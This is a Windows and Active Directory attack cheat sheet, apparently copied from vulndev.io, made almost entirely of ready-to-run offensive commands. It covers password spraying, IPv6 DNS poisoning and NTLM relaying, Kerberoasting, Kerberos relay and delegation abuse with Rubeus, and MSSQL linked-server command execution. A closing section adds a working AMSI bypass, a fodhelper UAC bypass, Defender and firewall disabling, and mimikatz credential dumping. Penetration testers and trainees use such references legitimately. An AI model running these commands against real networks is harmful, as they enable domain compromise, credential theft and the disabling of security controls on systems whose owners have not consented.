##
#
https://vulndev.io/cheats-windows/
#
##

Active Directory

Quick Wins

    Spoofing/Relaying (NBTNS/LLMNR, MitM6, Honeypotting)
    Password Spraying / Phishing
    Kerberoast / Asreproast & Cracking
    Weak ACLs via Bloodhound
    Credential Reuse
    Looting Shares
    AD CVEs
    SSH with domain accounts to linux machines
    Coercing Authentication & Relaying (e.g. ADCS, SMB)

Password Spraying

Tools: kerbrute
kerbrute passwordspray -d example.com --dc <dcip> users.txt <password to spray>

IPv6 DNS Takeover & Relay

Requirements: IPv6 enabled
Result: Traffic interception
Tools: mitm6, impacket
# give yourself any ipv6 address
ip -6 addr add fe80::13:37/10 dev <iface>
# poison single host
mitm6 -hw <host> -d <domain> --ignore-nofqdn
# poison whole network
mitm6 -d <net>
# relay to smb in order to open a socks connection
ntlmrelayx.py -6 -wh <net> -t smb://<ip> -l ~/tmp/ -socks -debug
# relay to dlap in order to create a new machine account, which gives us local system on the poisoned box
ntlmrelayx.py -t ldaps://<dc>.<domain> -wh attacker-wpad --delegate-access
# impersonate user on overtaken machine account
getST.py -spn cifs/<original computer acc>.<domain>/<new computer acc> -impersonate <user>

Update DNS Records

Requirements: Permission to update DNS (e.g. member of DNSAdmins)
Result: Traffic interception
Tools: Powermad
# https://github.com/Kevin-Robertson/Powermad
$user = '<user>'
$pass = ConvertTo-SecureString -AsPlainText '<pass>' -Force
$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user,$pass
invoke-dnsupdate -credential $cred -dnsname <dns entry> -dnsdata <lhost>

Asreproast

Requirements: Name of a user that has “does not require preauthentication” set
Result: Potentially crackable hashes of a domain users
Tools: impacket,Rubeus
impacket-GetNPUsers example.com/ -usersfile users.txt

Kerberoast

Requirements: Low privileged domain user credentials (pth possible)
Result: Potentially crackable hashes of service accounts
Tools: Impacket, Rubeus
impacket-GetUserSPNs -request -dc-ip <ip> example.com/username

Kerberos Relaying

Requirements: Shell on a domain machine with a low privileged domain user account
Result: SYSTEM access on that machine
Tools: KrbRelayUp, KrbRelay
.\relay.exe relay -Domain example.com -CreateNewComputerAccount -ComputerName abc$ -ComputerPassword Start123! -cls <CLS>
.\relay.exe spawn -m rbcd -d example.com -dc dc.example.com -cn abc$ -cp Start123! -sc "<path>"

CLSIDs (confirmed working on Server 2019/2022 with ADCS installed):

    c980e4c2-c178-4572-935d-a8a429884806
    90f18417-f0f1-484e-9d3c-59dceee5dbd8
    03ca98d6-ff5d-49b8-abc6-03dd84127020
    d99e6e73-fc88-11d0-b498-00a0c90312f3 (certsrv.exe)
    42cbfaa7-a4a7-47bb-b422-bd10e9d02700
    000c101c-0000-0000-c000-000000000046
    1b48339c-d15e-45f3-ad55-a851cb66be6b
    49e6370b-ab71-40ab-92f4-b009593e4518
    50d185b9-fff3-4656-92c7-e4018da4361d
    3c6859ce-230b-48a4-be6c-932c0c202048 (trusted installer service)

Find a CLSID for a specific OS (as admin on a comparable machine to your target):
Import-Module .\OleViewDotNet.psd1
Get-ComDatabase -SetCurrent
$comdb = Get-CurrentComDatabase
$clsids = (Get-ComClass).clsid
Get-ComProcess -DbgHelpPath 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\dbghelp.dll' | select ProcessId,ExecutablePath,Name,AppId,User,AuthnLevel,ImpLevel

Constrained Delegation

Requirements: Machine or user account with msds-allowedtodelegateto & TRUSTED_TO_AUTH_FOR_DELEGATION set to a target, e.g. cifs/ms01.example.com
Result: Authenticate as any user against the target (e.g. as DA)
Tools: Rubeus

Here a computer or user has defined what resources it can delegate authtentication to.
Import-Module .\Invoke-Rubeus.ps1
Invoke-Rubeus "asktgt /user:srv01$ /rc4:<hash> /outfile:ticket.kirbi"
Invoke-Rubeus "s4u /impersonateuser:administrator /msdsspn:cifs/srv02 /ticket:ticket.kirbi /altservice:cifs,host,rpcss,http /ptt"

Alternative:
.\Rubeus.exe s4u /user:srv01$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:"cifs/srv02" /altservice:host,rpc,cifs,http /ptt

Resource-based Constrained Delegation

Requirements: Write access to a target computer account (to set msDS-AllowedToActOnBehalfOfOtherIdentity) & ability to create new machine accounts
Result: Authenticate as any user against the target (e.g. as DA)
Tools: PowerMad, PowerView, Rubeus

Here a computer has defined who they trust to delegation auth to them (reverse of constrained delegation).
$pw = ConvertTo-SecureString 'Start123!' -AsPlainText -Force
New-MachineAccount -MachineAccount xct -Password $pw
$ComputerSid = Get-DomainComputer xct -Properties objectsid | Select -Expand objectsid
  
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
  
$machine = Get-DomainComputer <target>
$machine | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
 
.\Rubeus.exe s4u /user:xct$ /rc4:<hash of your chosen password> /impersonateuser:administrator /msdsspn:cifs/target /altservice:cifs,host,rpcss,http /ptt

This can also be done via Standin:
.\StandIn.exe --computer xct --make
.\StandIn.exe --computer dc --sid <sid>
.\Rubeus.exe s4u /user:xct /rc4:6dfcb20c87d04f9a4f9605f2413395d4 /impersonateuser:administrator /msdsspn:cifs/dc.example.com /nowrap /ptt

Read LAPS Password

Requirements: Permission to read laps passwords
Result: Local administrator password to a machine that uses LAPS
Tools: Default AD-Module or LAPSToolkit
import-module activedirectory; get-adcomputer -identity "<machine>" -properties  ms-mcs-admpwd

MSSQL

Check if a user can be impersonated:
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';

Check for linked servers:
select * from master..sysservers

Run query on linked server:
select * from openquery("SRV02",'select system_user')

Use server link to execute system commands on a remote server:
EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT SRV02
EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT SRV02
EXEC ('xp_cmdshell ''powershell.exe -exec bypass -c "..."'';') AT SRV02

Use server link to execute system commands on own server via a remote server (go to remote & come back):
EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT SRV01') AT SRV02
EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT SRV01') AT SRV02
EXEC ('EXEC (''xp_cmdshell ''''powershell.exe -exec bypass -c "..."'''';'') AT SRV01') AT SRV02

Shell via impacket:
impacket-mssqlclient example.com/'srv01$'@<ip> -port 1433 -windows-auth -hashes :<hash>

Silver Tickets

Requirements: Password/Hash of an account that is used to run a service (e.g. mssql, webserver)
Result: Impersonate any user in the context of this application
Tools: Impacket, Mimikatz

Detailed example in this blog post.
Auth Coercion

Result: Force a target system to authenticate to your machine (in order to relay it to LDAP/SMB/ADCS)

    MS-FSRVP https://github.com/ShutdownRepo/ShadowCoerce (not default, needs File Server VSS Agent Service)
    MS-DFSNM https://github.com/Wh04m1001/DFSCoerce (default on DCs)
    MS-EFSRPC https://github.com/topotam/PetitPotam (default on DCs but several methods patched)
    MS-RPRN (Printerbug) https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py (requires print spooler running)

Misc

Disable AV (as administrator):
Add-MpPreference -ExclusionPath C:\temp
Set-MpPreference -DisableRealtimeMonitoring $true

Dump passwords:
.\mimikatz.exe "token::elevate" "privilege::debug" "sekurlsa::logonpasswords" "exit"

AMSI Bypass:
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)


UAC Bypass:
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute>
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -exec bypass -enc ...=" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"

Get MD4 hash via python:
import hashlib,binascii
hash = hashlib.new('md4', "Start123!".encode('utf-16le')).digest()
print(binascii.hexlify(hash))

Enable RDP with non-default admin user:
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
netsh advfirewall set allprofiles state off

Decrypt PowerShell stored credential:
(Import-Clixml C:\credential.xml).GetNetworkCredential().Password

Port forwarding using netsh:
Listen on port 8000 on the windows machine & forward all incoming connections to <ip> on port 443.
netsh advfirewall firewall add rule name="offsec" dir=in action=allow protocol=TCP localport=8000
netsh interface portproxy add v4tov4 listenport=8000 listenaddress=0.0.0.0 connectport=443 connectaddress=<ip>

List all named pipes:
[System.IO.Directory]::GetFiles("\\.\\pipe\\")
